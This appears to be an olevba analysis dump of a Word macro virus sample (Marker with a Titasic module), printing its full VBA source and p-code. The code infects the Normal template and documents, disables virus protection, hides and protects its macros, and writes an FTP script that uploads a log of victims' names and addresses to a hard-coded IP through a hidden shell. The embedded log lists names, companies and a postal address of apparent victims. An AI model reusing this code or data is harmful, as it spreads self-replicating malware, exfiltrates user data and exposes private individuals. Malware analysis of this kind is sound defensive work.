olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marker.t
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Marker.t - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()

On Error Resume Next

Const Marker = "<- this is a marker!"

'Declare Variables
Dim SaveDocument, SaveNormalTemplate, DocumentInfected, NormalTemplateInfected As Boolean
Dim AD, NT As Object
Dim OurCode, UserAddress, LogData, LogFile As String

'Initialize Variables
Set AD = ActiveDocument.VBProject.VBComponents.Item(1)
Set NT = NormalTemplate.VBProject.VBComponents.Item(1)

DocumentInfected = AD.CodeModule.Find(Marker, 1, 1, 10000, 10000)
NormalTemplateInfected = NT.CodeModule.Find(Marker, 1, 1, 10000, 10000)


'Switch the VirusProtection on
Options.VirusProtection = True


  If (Day(Now()) = 1) And (System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogFile") = False) Then
  
    If DocumentInfected = True Then
      LogData = AD.CodeModule.Lines(1, AD.CodeModule.CountOfLines)
    ElseIf NormalTemplateInfected = True Then
      LogData = NT.CodeModule.Lines(1, NT.CodeModule.CountOfLines)
    End If
    
    LogData = Mid(LogData, InStr(1, LogData, "' Log" & "file -->"), Len(LogData) - InStr(1, LogData, "' Log" & "file -->"))
    
    For i = 1 To 4
      LogFile = LogFile + Mid(Str(Int(8 * Rnd)), 2, 1)
    Next i
    LogFile = "C:\hsf" & LogFile & ".sys"
    
    Open LogFile For Output As #1
    Print #1, LogData
    Close #1
    
    Open "c:\netldx.vxd" For Output As #1
    Print #1, "o 209.201.88.110"
    Print #1, "user anonymous"
    Print #1, "pass itsme@"
    Print #1, "cd incoming"
    Print #1, "ascii"
    Print #1, "put " & LogFile
    Print #1, "quit"
    Close #1
    
    Shell "command.com /c ftp.exe -n -s:c:\netldx.vxd", vbHide
    
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogFile") = True
    
  End If


'Make sure that some conditions are true before we continue infecting anything
If (DocumentInfected = True Xor NormalTemplateInfected = True) And _
   (ActiveDocument.SaveFormat = wdFormatDocument Or _
   ActiveDocument.SaveFormat = wdFormatTemplate) Then
   
   
  'Infect the NormalTemplate
  If DocumentInfected = True Then
  
    SaveNormalTemplate = NormalTemplate.Saved
  
    OurCode = AD.CodeModule.Lines(1, AD.CodeModule.CountOfLines)

    
    'Write a log file of this NormalTemplate infection
    For i = 1 To Len(Application.UserAddress)
      If Mid(Application.UserAddress, i, 1) <> Chr(13) Then
        If Mid(Application.UserAddress, i, 1) <> Chr(10) Then
          UserAddress = UserAddress & Mid(Application.UserAddress, i, 1)
        End If
      Else
        UserAddress = UserAddress & Chr(13) & "' "
      End If
    Next i

    OurCode = OurCode & Chr(13) & _
              "' " & Format(Time, "hh:mm:ss AMPM - ") & _
                     Format(Date, "dddd, d mmm yyyy") & Chr(13) & _
              "' " & Application.UserName & Chr(13) & _
              "' " & UserAddress & Chr(13)


    NT.CodeModule.DeleteLines 1, NT.CodeModule.CountOfLines
    NT.CodeModule.AddFromString OurCode
    
    If SaveNormalTemplate = True Then NormalTemplate.Save
    
  End If


  'Infect the ActiveDocument
  If NormalTemplateInfected = True And _
     (Mid(ActiveDocument.FullName, 2, 1) = ":" Or _
     ActiveDocument.Saved = False) Then
  
    SaveDocument = ActiveDocument.Saved
    
    OurCode = NT.CodeModule.Lines(1, NT.CodeModule.CountOfLines)

    AD.CodeModule.DeleteLines 1, AD.CodeModule.CountOfLines
    AD.CodeModule.AddFromString OurCode
    
    If SaveDocument = True Then ActiveDocument.Save
      
  End If
  
    
End If

End Sub

' Logfile -->

' 09:08:36  - Saturday, 28 Nov 1998
' SPo0Ky
' Blue Planet
'



' 02:50:31 PM - Saturday, 28 Nov 1998
' MARK B. SEAY
'



' 08:04:45 AM - Friday, 4 Dec 1998
' UPS
'



' 11:43:35 AM - Thursday, 17 Dec 1998
' WRO
'



' 11:16:41 AM - Wednesday, 23 Dec 1998
' BCBSA
'



' 01:30:35 PM - Wednesday, 30 Dec 1998
' BCBSA
'



' 01:36:45 PM - Monday, 4 Jan 1999
' Sue Rosinski
'



' 03:03:59 PM - Tuesday, 5 Jan 1999
' BCBSA
'



' 01:52:36 PM - Monday, 18 Jan 1999
' David W. Nelson
' Belden Enterprises, Inc.
' 1835 W. Roscoe St.
' Chicago, IL  60657



' 11:27:09 AM - Wednesday, 20 Jan 1999
' Tim Henthorn
'



' 10:34:42 AM - Thursday, 28 Jan 1999
' Shirley Moran
'



' 11:51:36  - Tuesday, 2 Feb 1999
' Jan Tissera
'



' 11:09:36 AM - Wednesday, 10 Feb 1999
' SALES AND MARKETING
'



' 03:58:57 PM - Friday, 12 Feb 1999
' FOOD & BEVERAGE
'



' 05:40:20 PM - Friday, 12 Feb 1999
' FOOD & BEVERAGE
'



' 12:18:32 AM - Wednesday, 1 Jan 1997
' Ricardo Calixto Gomecua
' FR. BENILDA GOMECUA
'       142 FORTUNA ST
'       PASAY CITY M.M.
'       PHILIPPINES



' 07:59:16 PM - Thursday, 4 Mar 1999
' john
'



' 10:28:43 AM - Tuesday, 9 Mar 1999
' OPEY A.
' CNNHS B'92 PHILIPPINES (CNSC)



' 05:30:17 PM - Sunday, 7 Mar 1999
' OPEY A.
' CNNHS B'92 PHILIPPINES (CNSC)



' 10:51:44 AM - Wednesday, 3 Feb 1999
' OPEY A.
' CNNHS B'92 PHILIPPINES (CNSC)



' 11:35:29 AM - Tuesday, 26 Jan 1999
' OPEY A.
' CNNHS B'92 PHILIPPINES (CNSC)



' 06:26:43 AM - Thursday, 18 Mar 1999
' OPEY A.
' CNNHS B'92 PHILIPPINES (CNSC)



' 06:36:03 PM - Saturday, 20 Mar 1999
' OPEY A.
' CNNHS B'92 PHILIPPINES (CNSC)



' 03:44:39 AM - Sunday, 4 Apr 1999
' OPEY A.
' CNNHS B'92 PHILIPPINES (CNSC)



' 02:05:58 PM - Tuesday, 6 Apr 1999
' OPEY A.
' CNNHS B'92 PHILIPPINES (CNSC)



' 02:49:10 PM - Saturday, 10 Apr 1999
' OPEY A.
' CNNHS B'92 PHILIPPINES (CNSC)



' 12:31:07 PM - Saturday, 16 Feb 1980
' OPEY A.
' CNNHS B'92 PHILIPPINES (CNSC)



' 08:44:52 AM - Tuesday, 25 May 1999
' OPEY A.
' CNNHS B'92 PHILIPPINES (CNSC)



Private Sub ToggleButton1_Click()

End Sub
' 03:41:35 PM - Wednesday, 9 Jun 1999
' OPEY A.
' CNNHS B'92 PHILIPPINES (CNSC)



' 10:29:55 PM - Tuesday, 3 Aug 1999
' OPEY A.
' CNNHS B'92 PHILIPPINES (CNSC)



' 11:28:43 AM - Friday, 10 Sep 1999
' OPEY A.
' CNNHS B'92 PHILIPPINES (CNSC)



' 10:45:00 AM - Friday, 8 Oct 1999
' San Miguel Brewing Philippines
'



' 01:23:48 PM - Wednesday, 24 Nov 1999
' polo
'



' 02:09:19 PM - Tuesday, 21 Dec 1999
' archie b. gupalor
'



' 10:06:09 AM - Friday, 10 Mar 2000
' Ulysses R. Gotera
' FoxChit SOFTWARE SOLUTIONS



' 04:46:18 PM - Saturday, 25 Mar 2000
' Bill Gates
'



' 12:39:44 PM - Friday, 27 Oct 2000
' OPEY A.
' CNNHS B'92 PHILIPPINES (CNSC)



' 12:58:13 PM - Friday, 10 Nov 2000
' OPEY A.
' CNNHS B'92 PHILIPPINES (CNSC)



' 01:45:41 PM - Wednesday, 15 Nov 2000
' OPEY A.
' CNNHS B'92 PHILIPPINES (CNSC)



' 01:05:28 PM - Thursday, 8 Feb 2001
' OPEY A.
' CNNHS B'92 PHILIPPINES (CNSC)



-------------------------------------------------------------------------------
VBA MACRO astia.bas 
in file: Virus.MSWord.Marker.t - OLE stream: 'Macros/VBA/astia'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public AD As Object, aDes As Variant
Public NonTitasic As Boolean, afound As Boolean, hapus As Boolean, reset As Boolean, aExc As Boolean, DocCount As Boolean
Function AstMaster()
Dim nmak(1) As String
Dim NT As Object
Dim aSrc$
On Error GoTo selesai
nmak(0) = "astia"
nmak(1) = "TITASIC"

aSrc = MacroContainer
Set NT = NormalTemplate
If Not DocCount Then
Set AD = ActiveDocument
ElseIf aSrc <> "SNrml.dot" Then
aSrc = NT
End If

If aSrc = NT Then
aSrc = NT.FullName: Set aDes = AD
ElseIf aSrc = AD Then
aSrc = AD.FullName: Set aDes = NT
ElseIf aSrc = "SNrml.dot" Then
Set aDes = NT
aSrc = Options.DefaultFilePath(8) & "\SNrml.src"
End If

Mhapus aDes
With aDes.VBProject
If Not (Not hapus And .Description = "astia" And .VBComponents.Count > 2) Then
    Mcopy aSrc, aDes, nmak
    hapus = False
    .Description = "astia"
    If aDes = NT Then
        Options.SaveInterval = 1
        CustomizationContext = NT
        CommandBars("Tools").reset
        KeyBindings.Add KeyCode:=BuildKeyCode(77, 1024), KeyCategory:=1, _
        Command:="ToolsRecordMacroStart"
        aDes.Save
    End If
    CommandBars("Macro").Controls(2).OnAction = "ViewVbCode"
Else
GoTo Aksi
End If
End With
If afound = True Then Exit Function
Refresh
On Error Resume Next
Aksi:
If aExc = True Then Exit Function
Exit Function
selesai:
If Err.Number = 50289 Then MsgBox "Terimakasih Anda Telah" & Chr(13) & "Memproteksi Word dengan Aman", vbInformation, "Titasic"
End Function

Sub Mhapus(Sfile)
Dim nmak As Object
For Each nmak In Sfile.VBProject.VBComponents
    If nmak.Name = "NewMacros" Then NonTitasic = True
    If nmak.Name <> "ThisDocument" And nmak.Name <> "NewMacros" _
    And nmak.Name <> "astia" And nmak.Name <> "TITASIC" Then
        hapus = True
        If reset Then
        Application.OrganizerDelete Sfile.FullName, nmak.Name, 3
        Else
        nmak.CodeModule.DeleteLines 1, nmak.CodeModule.CountOfLines
        End If
    End If
Next nmak
End Sub
Sub Mcopy(Sfile, Dfile, nmak)
Dim aNmak
For Each aNmak In nmak
Application.OrganizerCopy Sfile, Dfile.FullName, aNmak, 3
Next
End Sub
Sub Action()
Documents.Add
On Error Resume Next
With ActiveWindow
.Caption = "Titasic"
.ActivePane.View.Zoom.Percentage = 100
.View.FullScreen = Not .View.FullScreen
.DisplayRulers = False
.DisplayHorizontalScrollBar = False
.DisplayVerticalRuler = False
.DisplayVerticalScrollBar = False
.View.ShowTextBoundaries = False
    CommandBars("Full Screen").Position = 1
    With CommandBars("Full Screen").Controls(1)
    .Caption = "Titasic," & "  " & Date
    .Style = 3
    .FaceId = 281
    End With
.View.Type = 6
Randomize
With ActiveDocument.Background.Fill
    .Visible = True
    .PresetGradient Int((6 - 1 + 1) * Rnd + 1), 1, Int((24 - 1 + 1) * Rnd + 1)
End With
TITASIC.Show
.View.FullScreen = Not .View.FullScreen
End With
CommandBars("Full Screen").reset
WBT
ActiveDocument.Close 0
WBF
End Sub
Sub FileOpen()
WBT
If Dialogs(80).Show <> 0 Then
WBF
AutoOpen
Else
WBF
End If
End Sub

Sub AutoOpen()
Application.EnableCancelKey = wdCancelDisabled
AstMaster
If Documents.Count > 1 Then
    For i = 1 To Documents.Count
    If Documents(i).Name <> ActiveDocument.Name Then
    Set AD = Documents(i)
    DocCount = True
    hapus = False
    AstMaster
    End If
    Next
End If
If Now > DateSerial(1998, 9, 10) Then Application.OnTime When:=Now + TimeValue("00:45:00"), Name:="astia.Action"
End
End Sub
Sub ViewVbCode()
If MsgBox("Maaf.." & Chr(13) & "Anda jangan coba-coba mengedit, merubah, ataupun menghapus makro Titasic..!!" & Chr(13) & Chr(13) _
& "Anda hanya bisa merekam makro, menyimpan, menggunakan" & Chr(13) & "serta menghapus makro buatan Anda" & Chr(13) & Chr(13) & " Apakah Anda ingin merekam makro..?", vbExclamation + vbYesNo, "Titasic") _
= vbYes Then SendKeys "%m%s{down}~%d'Macro non-Titasic'%m"
End Sub
Sub AutoExec()
On Error Resume Next
If MacroContainer <> NormalTemplate Then
aExc = True
AstMaster
WBT
AddIns.Unload False
WBF
End If
Application.EnableCancelKey = wdCancelDisabled
End Sub
Sub AutoExit()
Dim aAddin As Object
On Error GoTo batal
WBT
If Documents.Count <> 0 Then Documents.Close
Options.DefaultFilePath(2) = Options.DefaultFilePath(6)
afound = True
For Each aAddin In AddIns
    If aAddin.Name = "SNrml.dot" Then afound = False
Next aAddin
        
If afound = True Then
Application.Visible = False
Documents.Add
AstMaster
    With ActiveDocument
        .SaveAs FileName:=Options.DefaultFilePath(8) & "\SNrml.src", FileFormat:=wdFormatDocument, AddToRecentFiles:=False
        .SaveAs FileName:=Options.DefaultFilePath(8) & "\SNrml.dot", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False
    End With
End If
Application.Quit
batal:
WBF
End Sub
Sub ToolsMacro()
WBF
On Error GoTo batal
Mhapus ActiveDocument
If NonTitasic Then
    If MacroContainer = ActiveDocument Then Application.Run NormalTemplate.VBProject.Name & ".astia.ToolsMacro": Exit Sub
    Application.DisplayAlerts = 0
        With Dialogs(215)
        .Description = "Macros Titasic mungkin tidak bisa Anda hapus, Anda hanya bisa menghapus makro buatan Anda (Descr: 'Makro non-Titasic')"
        If .Display = 1 Then .Execute
        End With
    Application.DisplayAlerts = -1
Else
ViewVbCode
End If
batal:
End Sub
Sub FileTemplates()
WBF
If Not reset Then Dialogs(87).Display
End Sub
Sub FormatStyle()
WBF
Dialogs(180).Show
End Sub
Function Refresh()
reset = True
FileTemplates
Mhapus aDes
End Function
Sub AutoClose()
Application.DisplayAlerts = -1
With Options
.SaveNormalPrompt = False
.SaveInterval = 10
.VirusProtection = False
End With
If ActiveWindow.Caption <> "Titasic" And InStr(1, ActiveDocument.Name, "Docume", 1) = 0 _
And ActiveDocument.Name <> "SNrml.dot" Then AstMaster
End Sub
Sub FileExit()
AutoExit
End Sub
Sub ToolsOptions()
Options.DefaultFilePath(wdUserTemplatesPath) = "C:\Program Files\Microsoft Office\Templates"
Dialogs(wdDialogToolsOptions).Show
Options.DefaultFilePath(wdUserTemplatesPath) = Application.Path
End Sub
Function WBT()
WordBasic.disableautomacros True
End Function
Function WBF()
WordBasic.disableautomacros False
End Function

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Marker.t
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 18741 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Close())
' Line #1:
' Line #2:
' 	OnError (Resume Next) 
' Line #3:
' Line #4:
' 	Dim (Const) 
' 	LitStr 0x0014 "<- this is a marker!"
' 	VarDefn Marker
' Line #5:
' Line #6:
' 	QuoteRem 0x0000 0x0011 "Declare Variables"
' Line #7:
' 	Dim 
' 	VarDefn SaveDocument
' 	VarDefn SaveNormalTemplate
' 	VarDefn DocumentInfected
' 	VarDefn NormalTemplateInfected (As Boolean)
' Line #8:
' 	Dim 
' 	VarDefn AD
' 	VarDefn NT (As Object)
' Line #9:
' 	Dim 
' 	VarDefn OurCode
' 	VarDefn UserAddress
' 	VarDefn LogData
' 	VarDefn LogFile (As String)
' Line #10:
' Line #11:
' 	QuoteRem 0x0000 0x0014 "Initialize Variables"
' Line #12:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set AD 
' Line #13:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set NT 
' Line #14:
' Line #15:
' 	Ld Marker 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x2710 
' 	LitDI2 0x2710 
' 	Ld AD 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	St DocumentInfected 
' Line #16:
' 	Ld Marker 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x2710 
' 	LitDI2 0x2710 
' 	Ld NT 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	St NormalTemplateInfected 
' Line #17:
' Line #18:
' Line #19:
' 	QuoteRem 0x0000 0x001D "Switch the VirusProtection on"
' Line #20:
' 	LitVarSpecial (True)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #21:
' Line #22:
' Line #23:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0001 
' 	Eq 
' 	Paren 
' 	LitStr 0x0000 ""
' 	LitStr 0x003E "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info"
' 	LitStr 0x0007 "LogFile"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitVarSpecial (False)
' 	Eq 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #24:
' Line #25:
' 	Ld DocumentInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #26:
' 	LitDI2 0x0001 
' 	Ld AD 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld AD 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St LogData 
' Line #27:
' 	Ld NormalTemplateInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	ElseIfBlock 
' Line #28:
' 	LitDI2 0x0001 
' 	Ld NT 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld NT 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St LogData 
' Line #29:
' 	EndIfBlock 
' Line #30:
' Line #31:
' 	Ld LogData 
' 	LitDI2 0x0001 
' 	Ld LogData 
' 	LitStr 0x0005 "' Log"
' 	LitStr 0x0008 "file -->"
' 	Concat 
' 	FnInStr3 
' 	Ld LogData 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Ld LogData 
' 	LitStr 0x0005 "' Log"
' 	LitStr 0x0008 "file -->"
' 	Concat 
' 	FnInStr3 
' 	Sub 
' 	ArgsLd Mid$ 0x0003 
' 	St LogData 
' Line #32:
' Line #33:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0004 
' 	For 
' Line #34:
' 	Ld LogFile 
' 	LitDI2 0x0008 
' 	Ld Rnd 
' 	Mul 
' 	FnInt 
' 	ArgsLd Str 0x0001 
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Add 
' 	St LogFile 
' Line #35:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #36:
' 	LitStr 0x0006 "C:\hsf"
' 	Ld LogFile 
' 	Concat 
' 	LitStr 0x0004 ".sys"
' 	Concat 
' 	St LogFile 
' Line #37:
' Line #38:
' 	Ld LogFile 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #39:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld LogData 
' 	PrintItemNL 
' Line #40:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #41:
' Line #42:
' 	LitStr 0x000D "c:\netldx.vxd"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #43:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0010 "o 209.201.88.110"
' 	PrintItemNL 
' Line #44:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000E "user anonymous"
' 	PrintItemNL 
' Line #45:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000B "pass itsme@"
' 	PrintItemNL 
' Line #46:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000B "cd incoming"
' 	PrintItemNL 
' Line #47:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0005 "ascii"
' 	PrintItemNL 
' Line #48:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 "put "
' 	Ld LogFile 
' 	Concat 
' 	PrintItemNL 
' Line #49:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 "quit"
' 	PrintItemNL 
' Line #50:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #51:
' Line #52:
' 	LitStr 0x002A "command.com /c ftp.exe -n -s:c:\netldx.vxd"
' 	Ld vbHide 
' 	ArgsCall Shell 0x0002 
' Line #53:
' Line #54:
' 	LitVarSpecial (True)
' 	LitStr 0x0000 ""
' 	LitStr 0x003E "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info"
' 	LitStr 0x0007 "LogFile"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #55:
' Line #56:
' 	EndIfBlock 
' Line #57:
' Line #58:
' Line #59:
' 	QuoteRem 0x0000 0x004D "Make sure that some conditions are true before we continue infecting anything"
' Line #60:
' 	LineCont 0x0008 0B 00 03 00 12 00 03 00
' 	Ld DocumentInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld NormalTemplateInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	Xor 
' 	Paren 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatDocument 
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatTemplate 
' 	Eq 
' 	Or 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #61:
' Line #62:
' Line #63:
' 	QuoteRem 0x0002 0x0019 "Infect the NormalTemplate"
' Line #64:
' 	Ld DocumentInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #65:
' Line #66:
' 	Ld NormalTemplate 
' 	MemLd Saved 
' 	St SaveNormalTemplate 
' Line #67:
' Line #68:
' 	LitDI2 0x0001 
' 	Ld AD 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld AD 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St OurCode 
' Line #69:
' Line #70:
' Line #71:
' 	QuoteRem 0x0004 0x0031 "Write a log file of this NormalTemplate infection"
' Line #72:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Application 
' 	MemLd UserAddress 
' 	FnLen 
' 	For 
' Line #73:
' 	Ld Application 
' 	MemLd UserAddress 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Ne 
' 	IfBlock 
' Line #74:
' 	Ld Application 
' 	MemLd UserAddress 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Ne 
' 	IfBlock 
' Line #75:
' 	Ld UserAddress 
' 	Ld Application 
' 	MemLd UserAddress 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Concat 
' 	St UserAddress 
' Line #76:
' 	EndIfBlock 
' Line #77:
' 	ElseBlock 
' Line #78:
' 	Ld UserAddress 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	St UserAddress 
' Line #79:
' 	EndIfBlock 
' Line #80:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #81:
' Line #82:
' 	LineCont 0x0010 09 00 0E 00 12 00 15 00 1E 00 0E 00 29 00 0E 00
' 	Ld OurCode 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	Ld Time 
' 	LitStr 0x0010 "hh:mm:ss AMPM - "
' 	ArgsLd Format$ 0x0002 
' 	Concat 
' 	Ld Date 
' 	LitStr 0x0010 "dddd, d mmm yyyy"
' 	ArgsLd Format$ 0x0002 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	Ld UserAddress 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St OurCode 
' Line #83:
' Line #84:
' Line #85:
' 	LitDI2 0x0001 
' 	Ld NT 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld NT 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #86:
' 	Ld OurCode 
' 	Ld NT 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #87:
' Line #88:
' 	Ld SaveNormalTemplate 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #89:
' Line #90:
' 	EndIfBlock 
' Line #91:
' Line #92:
' Line #93:
' 	QuoteRem 0x0002 0x0019 "Infect the ActiveDocument"
' Line #94:
' 	LineCont 0x0008 05 00 05 00 13 00 05 00
' 	Ld NormalTemplateInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 ":"
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	Or 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #95:
' Line #96:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	St SaveDocument 
' Line #97:
' Line #98:
' 	LitDI2 0x0001 
' 	Ld NT 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld NT 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St OurCode 
' Line #99:
' Line #100:
' 	LitDI2 0x0001 
' 	Ld AD 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld AD 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #101:
' 	Ld OurCode 
' 	Ld AD 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #102:
' Line #103:
' 	Ld SaveDocument 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #104:
' Line #105:
' 	EndIfBlock 
' Line #106:
' Line #107:
' Line #108:
' 	EndIfBlock 
' Line #109:
' Line #110:
' 	EndSub 
' Line #111:
' Line #112:
' 	QuoteRem 0x0000 0x000C " Logfile -->"
' Line #113:
' Line #114:
' 	QuoteRem 0x0000 0x0022 " 09:08:36  - Saturday, 28 Nov 1998"
' Line #115:
' 	QuoteRem 0x0000 0x0007 " SPo0Ky"
' Line #116:
' 	QuoteRem 0x0000 0x000C " Blue Planet"
' Line #117:
' 	QuoteRem 0x0000 0x0000 ""
' Line #118:
' Line #119:
' Line #120:
' Line #121:
' 	QuoteRem 0x0000 0x0024 " 02:50:31 PM - Saturday, 28 Nov 1998"
' Line #122:
' 	QuoteRem 0x0000 0x000D " MARK B. SEAY"
' Line #123:
' 	QuoteRem 0x0000 0x0000 ""
' Line #124:
' Line #125:
' Line #126:
' Line #127:
' 	QuoteRem 0x0000 0x0021 " 08:04:45 AM - Friday, 4 Dec 1998"
' Line #128:
' 	QuoteRem 0x0000 0x0004 " UPS"
' Line #129:
' 	QuoteRem 0x0000 0x0000 ""
' Line #130:
' Line #131:
' Line #132:
' Line #133:
' 	QuoteRem 0x0000 0x0024 " 11:43:35 AM - Thursday, 17 Dec 1998"
' Line #134:
' 	QuoteRem 0x0000 0x0004 " WRO"
' Line #135:
' 	QuoteRem 0x0000 0x0000 ""
' Line #136:
' Line #137:
' Line #138:
' Line #139:
' 	QuoteRem 0x0000 0x0025 " 11:16:41 AM - Wednesday, 23 Dec 1998"
' Line #140:
' 	QuoteRem 0x0000 0x0006 " BCBSA"
' Line #141:
' 	QuoteRem 0x0000 0x0000 ""
' Line #142:
' Line #143:
' Line #144:
' Line #145:
' 	QuoteRem 0x0000 0x0025 " 01:30:35 PM - Wednesday, 30 Dec 1998"
' Line #146:
' 	QuoteRem 0x0000 0x0006 " BCBSA"
' Line #147:
' 	QuoteRem 0x0000 0x0000 ""
' Line #148:
' Line #149:
' Line #150:
' Line #151:
' 	QuoteRem 0x0000 0x0021 " 01:36:45 PM - Monday, 4 Jan 1999"
' Line #152:
' 	QuoteRem 0x0000 0x000D " Sue Rosinski"
' Line #153:
' 	QuoteRem 0x0000 0x0000 ""
' Line #154:
' Line #155:
' Line #156:
' Line #157:
' 	QuoteRem 0x0000 0x0022 " 03:03:59 PM - Tuesday, 5 Jan 1999"
' Line #158:
' 	QuoteRem 0x0000 0x0006 " BCBSA"
' Line #159:
' 	QuoteRem 0x0000 0x0000 ""
' Line #160:
' Line #161:
